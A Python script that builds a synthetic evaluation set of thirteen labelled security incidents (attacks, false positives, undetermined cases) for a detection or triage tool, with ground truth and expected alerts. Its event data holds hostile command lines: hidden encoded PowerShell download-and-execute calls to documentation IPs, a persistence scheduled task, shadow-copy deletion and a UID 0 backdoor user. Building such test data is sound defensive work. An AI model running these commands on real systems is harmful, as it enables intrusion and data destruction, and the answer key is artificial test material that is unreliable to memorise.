"""Write the evaluation set: data/eval/scenarios.json plus one event file per scenario.

Each scenario is a small synthetic incident with a known ground truth, chosen to test judgement,
not just detection: real attacks, benign activity that trips the rules (false positives), and
cases the data cannot settle. RFC 5737 documentation IPs only.

    python scripts/make_eval_set.py
"""

from __future__ import annotations

import base64
import json
from datetime import UTC, datetime, timedelta
from pathlib import Path
from typing import Any

OUT = Path(__file__).resolve().parent.parent / "data" / "eval"
PS = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"


def at(day: int, hh: int, mm: int, ss: int = 0) -> datetime:
    return datetime(2026, 4, day, hh, mm, ss, tzinfo=UTC)


def iso(t: datetime) -> str:
    return t.strftime("%Y-%m-%dT%H:%M:%SZ")


class Events:
    def __init__(self, prefix: str) -> None:
        self.prefix = prefix
        self.rows: list[dict[str, Any]] = []

    def add(self, t: datetime, **fields: Any) -> None:
        self.rows.append(
            {"event_id": f"{self.prefix}-{len(self.rows) + 1:04d}", "timestamp": iso(t), **fields}
        )

    def auth(self, t, user, host, src_ip, outcome, method="ntlm"):
        self.add(
            t,
            event_type="auth",
            action="logon",
            user=user,
            host=host,
            src_ip=src_ip,
            outcome=outcome,
            auth_method=method,
        )

    def proc(self, t, user, host, name, cmd, parent):
        self.add(
            t,
            event_type="process",
            action="process_start",
            user=user,
            host=host,
            process_name=name,
            command_line=cmd,
            parent_process=parent,
        )

    def net(self, t, host, src_ip, dst_ip, port, user=None):
        fields = {
            "event_type": "network",
            "action": "allowed",
            "host": host,
            "src_ip": src_ip,
            "dst_ip": dst_ip,
            "dst_port": port,
            "protocol": "tcp",
        }
        if user:
            fields["user"] = user
        self.add(t, **fields)

    def sorted(self) -> list[dict[str, Any]]:
        return sorted(self.rows, key=lambda r: (r["timestamp"], r["event_id"]))


def encoded(script: str) -> str:
    return base64.b64encode(script.encode("utf-16-le")).decode()


def s1() -> list[dict[str, Any]]:
    """Guessed password, then a hidden PowerShell download from the IOC server."""
    e = Events("S1")
    for d in range(1, 4):  # normal history: maria logs on from her desk every morning
        e.auth(at(d, 8, 40), "maria", "WS-MARIA01", "10.30.1.21", "success", "kerberos")
    start = at(6, 2, 10)
    for i in range(8):
        e.auth(start + timedelta(seconds=30 * i), "maria", "VPN-GW01", "203.0.113.77", "failure")
    e.auth(start + timedelta(minutes=4, seconds=30), "maria", "VPN-GW01", "203.0.113.77", "success")
    t = start + timedelta(minutes=9)
    e.proc(
        t,
        "maria",
        "WS-MARIA01",
        "powershell.exe",
        f"powershell.exe -w hidden -enc {encoded('IEX (iwr http://203.0.113.80/s.ps1)')} ; "
        "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.80/s.ps1')",
        "explorer.exe",
    )
    e.net(t + timedelta(seconds=4), "WS-MARIA01", "10.30.1.21", "203.0.113.80", 443, "maria")
    e.proc(
        t + timedelta(minutes=1),
        "maria",
        "WS-MARIA01",
        "whoami.exe",
        "whoami /all",
        "powershell.exe",
    )
    e.proc(
        t + timedelta(minutes=1, seconds=20),
        "maria",
        "WS-MARIA01",
        "net.exe",
        'net group "Domain Admins" /domain',
        "powershell.exe",
    )
    return e.sorted()


def s2() -> list[dict[str, Any]]:
    """Tom mistypes his password at his own desk, then works normally."""
    e = Events("S2")
    for d in range(1, 6):
        e.auth(at(d, 8, 55), "tom", "WS-TOM02", "10.30.1.44", "success", "kerberos")
        e.proc(at(d, 8, 57), "tom", "WS-TOM02", "outlook.exe", '"OUTLOOK.EXE"', "explorer.exe")
    start = at(6, 9, 1)
    for i in range(3):
        e.auth(
            start + timedelta(seconds=15 * i),
            "tom",
            "WS-TOM02",
            "10.30.1.44",
            "failure",
            "kerberos",
        )
    e.auth(start + timedelta(seconds=70), "tom", "WS-TOM02", "10.30.1.44", "success", "kerberos")
    e.proc(
        start + timedelta(minutes=2),
        "tom",
        "WS-TOM02",
        "outlook.exe",
        '"OUTLOOK.EXE"',
        "explorer.exe",
    )
    e.proc(
        start + timedelta(minutes=3),
        "tom",
        "WS-TOM02",
        "ms-teams.exe",
        '"ms-teams.exe"',
        "explorer.exe",
    )
    e.net(
        start + timedelta(minutes=3, seconds=10), "WS-TOM02", "10.30.1.44", "10.30.0.25", 443, "tom"
    )
    return e.sorted()


def s3() -> list[dict[str, Any]]:
    """The software-deployment agent runs the same encoded PowerShell every night."""
    e = Events("S3")
    cmd = (
        f"powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand "
        f"{encoded('& C:/ProgramData/Deploy/Update-AppAgent.ps1 -Quiet')}"
    )
    for d in range(1, 7):
        e.proc(at(d, 2, 0, 5), "svc_deploy", "SRV-APP03", "powershell.exe", cmd, "ccmexec.exe")
        e.net(at(d, 2, 0, 9), "SRV-APP03", "10.30.2.13", "10.30.0.40", 445, "svc_deploy")
    return e.sorted()


def s4() -> list[dict[str, Any]]:
    """One external IP tries one password against many accounts; nothing succeeds."""
    e = Events("S4")
    users = ["anna", "ben", "chris", "dana", "eli", "fay", "gus", "hana"]
    for i, user in enumerate(users):
        e.auth(
            at(6, 3, 0, 0) + timedelta(seconds=25 * i), user, "VPN-GW01", "198.51.100.66", "failure"
        )
    for d in range(4, 7):  # these users' normal logons come from inside
        e.auth(at(d, 8, 30), "anna", "WS-ANNA01", "10.30.1.60", "success", "kerberos")
    return e.sorted()


def s5() -> list[dict[str, Any]]:
    """A lab machine connects once to a listed IOC; no endpoint or logon telemetry exists."""
    e = Events("S5")
    e.net(at(6, 14, 22), "WS-LAB07", "10.30.9.17", "203.0.113.80", 443)
    e.net(at(6, 14, 25), "WS-LAB07", "10.30.9.17", "10.30.0.53", 53)
    return e.sorted()


def s6() -> list[dict[str, Any]]:
    """Wazuh: SSH password guessing against 'deploy', a success, then a new local user."""
    rows: list[dict[str, Any]] = []
    agent = {"id": "004", "name": "web-02", "ip": "10.30.3.8"}

    def add(t: datetime, rule: dict[str, Any], data: dict[str, Any] | None, log: str) -> None:
        rows.append(
            {
                "timestamp": t.strftime("%Y-%m-%dT%H:%M:%S.000+0000"),
                "id": f"{int(t.timestamp())}.{200001 + len(rows)}",
                "rule": rule,
                "agent": agent,
                "manager": {"name": "wazuh-manager"},
                "decoder": {"name": "sshd" if "sshd" in rule["groups"] else "useradd"},
                "location": "/var/log/auth.log",
                "full_log": log,
                **({"data": data} if data else {}),
            }
        )

    start = at(6, 23, 40)
    for i in range(7):
        add(
            start + timedelta(seconds=12 * i),
            {
                "level": 5,
                "id": "5760",
                "description": "sshd: authentication failed.",
                "groups": ["syslog", "sshd", "authentication_failed"],
                "mitre": {"id": ["T1110.001"]},
            },
            {"srcip": "192.0.2.150", "dstuser": "deploy"},
            f"Failed password for deploy from 192.0.2.150 port {40100 + i} ssh2",
        )
    add(
        start + timedelta(seconds=90),
        {
            "level": 10,
            "id": "5720",
            "description": "sshd: Multiple authentication failures.",
            "groups": ["syslog", "sshd", "authentication_failures"],
            "mitre": {"id": ["T1110"]},
        },
        {"srcip": "192.0.2.150", "dstuser": "deploy"},
        "",
    )
    add(
        start + timedelta(seconds=110),
        {
            "level": 3,
            "id": "5715",
            "description": "sshd: authentication success.",
            "groups": ["syslog", "sshd", "authentication_success"],
            "mitre": {"id": ["T1078"]},
        },
        {"srcip": "192.0.2.150", "dstuser": "deploy"},
        "Accepted password for deploy from 192.0.2.150 port 40180 ssh2",
    )
    add(
        start + timedelta(minutes=4),
        {
            "level": 8,
            "id": "5902",
            "description": "New user added to the system.",
            "groups": ["syslog", "adduser"],
            "mitre": {"id": ["T1136.001"]},
        },
        {"dstuser": "sysupd"},
        "useradd[3302]: new user: name=sysupd, UID=0, GID=0",
    )
    return rows


def s7() -> list[dict[str, Any]]:
    """Lena fails four times from an unfamiliar external IP, then gets in; nothing follows."""
    e = Events("S7")
    for d in range(2, 6):
        e.auth(at(d, 9, 5), "lena", "VPN-GW01", "198.51.100.20", "success")
    start = at(6, 19, 30)
    for i in range(4):
        e.auth(start + timedelta(seconds=40 * i), "lena", "VPN-GW01", "192.0.2.44", "failure")
    e.auth(start + timedelta(minutes=3), "lena", "VPN-GW01", "192.0.2.44", "success")
    return e.sorted()


SCENARIOS = [
    {
        "id": "s1_stolen_password_payload",
        "title": "Guessed VPN password, then hidden PowerShell download",
        "truth": "malicious",
        "story": "maria's password was guessed from 203.0.113.77; minutes later her workstation "
        "ran hidden, encoded PowerShell that pulled a script from the IOC server and ran "
        "discovery commands.",
        "build": s1,
        "adapter": "generic",
        "expected_alerts": {
            "auth.failures_then_success": 1,
            "auth.repeated_failures": 1,
            "process.suspicious_powershell": 1,
            "network.local_ioc_match": 1,
        },
        "investigate": "auth.failures_then_success",
    },
    {
        "id": "s2_mistyped_password",
        "title": "Three mistyped passwords at the user's own desk",
        "truth": "benign",
        "story": "tom mistyped his password three times on his own workstation at his usual "
        "time and IP, then read mail and opened Teams as on every other day.",
        "build": s2,
        "adapter": "generic",
        "expected_alerts": {"auth.failures_then_success": 1},
        "investigate": "auth.failures_then_success",
    },
    {
        "id": "s3_deployment_powershell",
        "title": "Nightly software-deployment PowerShell",
        "truth": "benign",
        "story": "The deployment agent (ccmexec.exe) runs the same encoded update script as "
        "svc_deploy every night at 02:00 and reaches only the internal package share.",
        "build": s3,
        "adapter": "generic",
        "expected_alerts": {"process.suspicious_powershell": 6},
        "investigate": "process.suspicious_powershell",
    },
    {
        "id": "s4_password_spray",
        "title": "Password spray against eight accounts, no success",
        "truth": "malicious",
        "story": "198.51.100.66 tried one password against eight accounts within three minutes. "
        "No attempt succeeded: an attack, but no compromise.",
        "build": s4,
        "adapter": "generic",
        "expected_alerts": {"auth.password_spray": 1},
        "investigate": "auth.password_spray",
    },
    {
        "id": "s5_lone_ioc_hit",
        "title": "One connection to a listed IOC, no endpoint telemetry",
        "truth": "undetermined",
        "story": "A lab machine connected once to a listed IOC. There are no process or logon "
        "events for it, so what made the connection cannot be known from this data.",
        "build": s5,
        "adapter": "generic",
        "expected_alerts": {"network.local_ioc_match": 1},
        "investigate": "network.local_ioc_match",
    },
    {
        "id": "s6_wazuh_ssh_backdoor_user",
        "title": "Wazuh: SSH brute force, login, then a UID 0 user created",
        "truth": "malicious",
        "story": "192.0.2.150 guessed deploy's SSH password on web-02 and created a root-level "
        "account 'sysupd' four minutes later (Wazuh alerts).",
        "build": s6,
        "adapter": "wazuh",
        "expected_alerts": {
            "auth.failures_then_success": 1,
            "auth.repeated_failures": 1,
            "siem.high_severity_alert": 1,
        },
        "investigate": "auth.failures_then_success",
    },
    {
        "id": "s7_unfamiliar_ip_login",
        "title": "Failures then success from an unfamiliar external IP, nothing after",
        "truth": "undetermined",
        "story": "lena usually connects from 198.51.100.20; this evening she failed four times "
        "from 192.0.2.44 and then got in. Travel and a new home router fit as well as a "
        "stolen password; nothing after the login tells them apart.",
        "build": s7,
        "adapter": "generic",
        "expected_alerts": {"auth.failures_then_success": 1},
        "investigate": "auth.failures_then_success",
    },
]


# --- Held-out scenarios ---------------------------------------------------------------------
# Written after the verifier and context evidence were tuned on s1-s7, and not used to tune
# them. Their score is the honest one; s1-s7 catch regressions.


def h1() -> list[dict[str, Any]]:
    """A Word document starts hidden PowerShell that downloads from a listed IOC and persists."""
    e = Events("H1")
    for d in range(1, 6):
        e.auth(at(d, 8, 50), "priya", "WS-PRIYA05", "10.30.1.85", "success", "kerberos")
        e.proc(at(d, 9, 5), "priya", "WS-PRIYA05", "winword.exe", '"WINWORD.EXE"', "explorer.exe")
    t = at(6, 10, 14)
    e.proc(
        t,
        "priya",
        "WS-PRIYA05",
        "winword.exe",
        '"WINWORD.EXE" /n "C:\\Users\\priya\\Downloads\\Invoice_4471.docm"',
        "explorer.exe",
    )
    e.proc(
        t + timedelta(seconds=20),
        "priya",
        "WS-PRIYA05",
        "powershell.exe",
        "powershell.exe -nop -w hidden -enc "
        + encoded("IEX (New-Object Net.WebClient).DownloadString('http://192.0.2.77/a')"),
        "winword.exe",
    )
    e.net(t + timedelta(seconds=23), "WS-PRIYA05", "10.30.1.85", "192.0.2.77", 80, "priya")
    e.proc(
        t + timedelta(seconds=50),
        "priya",
        "WS-PRIYA05",
        "schtasks.exe",
        'schtasks.exe /create /sc onlogon /tn "OneDriveSync" /tr '
        '"powershell -w hidden -f C:\\Users\\priya\\AppData\\Roaming\\sync.ps1"',
        "powershell.exe",
    )
    return e.sorted()


def h2() -> list[dict[str, Any]]:
    """The domain logon script maps drives with a hidden PowerShell window every morning."""
    e = Events("H2")
    cmd = (
        "powershell.exe -NoProfile -WindowStyle Hidden -File "
        "\\\\corp.example\\NETLOGON\\map-drives.ps1"
    )
    for d in range(1, 7):
        e.auth(at(d, 8, 30), "kim", "WS-KIM03", "10.30.1.70", "success", "kerberos")
        e.proc(at(d, 8, 30, 20), "kim", "WS-KIM03", "powershell.exe", cmd, "gpscript.exe")
        e.net(at(d, 8, 30, 24), "WS-KIM03", "10.30.1.70", "10.30.0.10", 445, "kim")
    return e.sorted()


def h3() -> list[dict[str, Any]]:
    """Monday morning: six staff each mistype once through the usual Citrix gateway, then log on."""
    e = Events("H3")
    users = ["omar", "lucy", "ivan", "rosa", "nick", "zara"]
    for d in range(1, 6):
        for i, user in enumerate(users):
            e.auth(at(d, 8, 50 + i), user, "CTX-GW01", "10.30.0.5", "success")
    start = at(6, 8, 52)
    for i, user in enumerate(users):
        t = start + timedelta(seconds=70 * i)
        e.auth(t, user, "CTX-GW01", "10.30.0.5", "failure")
        e.auth(t + timedelta(seconds=25), user, "CTX-GW01", "10.30.0.5", "success")
    return e.sorted()


def h4() -> list[dict[str, Any]]:
    """Wazuh (Windows): RDP password guessing, a successful logon, then shadow copies deleted."""
    rows: list[dict[str, Any]] = []
    agent = {"id": "007", "name": "WIN-FS01", "ip": "10.30.3.21"}

    def add(t: datetime, rule: dict[str, Any], system: dict[str, Any], ed: dict[str, Any]) -> None:
        rows.append(
            {
                "timestamp": t.strftime("%Y-%m-%dT%H:%M:%S.000+0000"),
                "id": f"{int(t.timestamp())}.{300001 + len(rows)}",
                "rule": rule,
                "agent": agent,
                "manager": {"name": "wazuh-manager"},
                "decoder": {"name": "windows_eventchannel"},
                "location": "EventChannel",
                "data": {"win": {"system": {"computer": "WIN-FS01", **system}, "eventdata": ed}},
            }
        )

    security = {"providerName": "Microsoft-Windows-Security-Auditing"}
    logon = {"targetUserName": "Administrator", "ipAddress": "198.51.100.200", "logonType": "10"}
    start = at(6, 1, 15)
    for i in range(6):
        add(
            start + timedelta(seconds=20 * i),
            {
                "level": 5,
                "id": "60122",
                "description": "Logon failure - Unknown user or bad password.",
                "groups": ["windows", "windows_security", "win_authentication_failed"],
                "mitre": {"id": ["T1078"]},
            },
            {**security, "eventID": "4625"},
            logon,
        )
    add(
        start + timedelta(seconds=125),
        {
            "level": 10,
            "id": "60204",
            "description": "Multiple Windows logon failures.",
            "groups": ["windows", "windows_security", "authentication_failures"],
            "mitre": {"id": ["T1110"]},
        },
        {**security, "eventID": "4625"},
        logon,
    )
    add(
        start + timedelta(seconds=150),
        {
            "level": 3,
            "id": "60106",
            "description": "Windows logon success.",
            "groups": ["windows", "windows_security", "authentication_success"],
            "mitre": {"id": ["T1078"]},
        },
        {**security, "eventID": "4624"},
        logon,
    )
    add(
        start + timedelta(minutes=7),
        {
            "level": 12,
            "id": "92032",
            "description": "Volume shadow copies deleted with vssadmin, possible ransomware.",
            "groups": ["sysmon", "sysmon_event1", "windows"],
            "mitre": {"id": ["T1490"]},
        },
        {"providerName": "Microsoft-Windows-Sysmon", "eventID": "1"},
        {
            "image": "C:\\Windows\\System32\\vssadmin.exe",
            "commandLine": "vssadmin.exe delete shadows /all /quiet",
            "parentImage": "C:\\Windows\\System32\\cmd.exe",
            "user": "WIN-FS01\\Administrator",
        },
    )
    return rows


def h5() -> list[dict[str, Any]]:
    """A developer pipes a web installer into Invoke-Expression; nothing else is recorded."""
    e = Events("H5")
    for d in range(1, 6):
        e.auth(at(d, 9, 10), "omar", "WS-OMAR02", "10.30.1.92", "success", "kerberos")
        e.proc(at(d, 9, 12), "omar", "WS-OMAR02", "code.exe", '"Code.exe"', "explorer.exe")
    t = at(6, 11, 3)
    e.proc(
        t,
        "omar",
        "WS-OMAR02",
        "powershell.exe",
        'powershell.exe -c "iex (irm https://tools.example.net/install.ps1)"',
        "WindowsTerminal.exe",
    )
    e.net(t + timedelta(seconds=2), "WS-OMAR02", "10.30.1.92", "198.51.100.140", 443, "omar")
    return e.sorted()


def h6() -> list[dict[str, Any]]:
    """The backup service account logs on over VPN from a listed spray source after guessing."""
    e = Events("H6")
    for d in range(1, 6):
        e.auth(at(d, 1, 0), "svc_backup", "SRV-BKP01", "10.30.2.20", "success", "kerberos")
    start = at(6, 3, 12)
    for i in range(5):
        e.auth(start + timedelta(seconds=45 * i), "svc_backup", "VPN-GW01", "192.0.2.77", "failure")
    e.auth(start + timedelta(minutes=4), "svc_backup", "VPN-GW01", "192.0.2.77", "success")
    return e.sorted()


HOLDOUT = [
    {
        "id": "h1_macro_powershell_persistence",
        "title": "Word macro starts hidden PowerShell, IOC download, scheduled task",
        "truth": "malicious",
        "story": "priya opened Invoice_4471.docm; Word started hidden, encoded PowerShell that "
        "downloaded from the listed IOC address 192.0.2.77 and created a logon task.",
        "build": h1,
        "adapter": "generic",
        "expected_alerts": {"process.suspicious_powershell": 1, "network.local_ioc_match": 1},
        "investigate": "process.suspicious_powershell",
    },
    {
        "id": "h2_logon_script_hidden_window",
        "title": "Domain logon script runs PowerShell hidden every morning",
        "truth": "benign",
        "story": "Group Policy (gpscript.exe) runs the NETLOGON drive-mapping script with a "
        "hidden window at every logon on kim's workstation; it reaches only the file server.",
        "build": h2,
        "adapter": "generic",
        "expected_alerts": {"process.suspicious_powershell": 6},
        "investigate": "process.suspicious_powershell",
    },
    {
        "id": "h3_monday_typos_gateway",
        "title": "Six users mistype once each through the usual Citrix gateway",
        "truth": "benign",
        "story": "Six staff who log on through CTX-GW01 (10.30.0.5) every morning each failed "
        "once and succeeded 25 seconds later. By source it looks like a spray, but each "
        "account got in on its second try from its usual source.",
        "build": h3,
        "adapter": "generic",
        "expected_alerts": {"auth.password_spray": 1},
        "investigate": "auth.password_spray",
    },
    {
        "id": "h4_wazuh_rdp_shadow_delete",
        "title": "Wazuh (Windows): RDP guessing, logon, shadow copies deleted",
        "truth": "malicious",
        "story": "198.51.100.200 guessed Administrator's password over RDP on WIN-FS01 and "
        "deleted all volume shadow copies seven minutes later, a ransomware precursor.",
        "build": h4,
        "adapter": "wazuh",
        "expected_alerts": {
            "auth.failures_then_success": 1,
            "auth.repeated_failures": 1,
            "siem.high_severity_alert": 2,
        },
        "investigate": "auth.failures_then_success",
    },
    {
        "id": "h5_dev_installer_iex",
        "title": "Developer pipes a web installer into Invoke-Expression",
        "truth": "undetermined",
        "story": "omar ran 'iex (irm https://tools.example.net/install.ps1)' from Windows "
        "Terminal. Many developer tools install this way, and so does malware; the script's "
        "content and what it did afterwards are not in the data.",
        "build": h5,
        "adapter": "generic",
        "expected_alerts": {"process.suspicious_powershell": 1},
        "investigate": "process.suspicious_powershell",
    },
    {
        "id": "h6_service_account_ioc_vpn",
        "title": "Backup service account guessed over VPN from a listed spray source",
        "truth": "malicious",
        "story": "svc_backup only ever logs on from the backup server; at 03:12 it was guessed "
        "over VPN from 192.0.2.77, an address on the IOC list as a password-spray source.",
        "build": h6,
        "adapter": "generic",
        "expected_alerts": {"auth.failures_then_success": 1, "auth.repeated_failures": 1},
        "investigate": "auth.failures_then_success",
    },
]


def main() -> None:
    (OUT / "scenarios").mkdir(parents=True, exist_ok=True)
    manifest = []
    specs = [s | {"set": "tuning"} for s in SCENARIOS] + [s | {"set": "holdout"} for s in HOLDOUT]
    for spec in specs:
        rows = spec["build"]()
        file = f"scenarios/{spec['id']}.jsonl"
        (OUT / file).write_text(
            "".join(json.dumps(r, sort_keys=True) + "\n" for r in rows), encoding="utf-8"
        )
        manifest.append({k: v for k, v in spec.items() if k != "build"} | {"file": file})
    (OUT / "scenarios.json").write_text(
        json.dumps({"version": 1, "scenarios": manifest}, indent=2) + "\n", encoding="utf-8"
    )
    print(f"wrote {len(manifest)} scenarios to {OUT}")


if __name__ == "__main__":
    main()
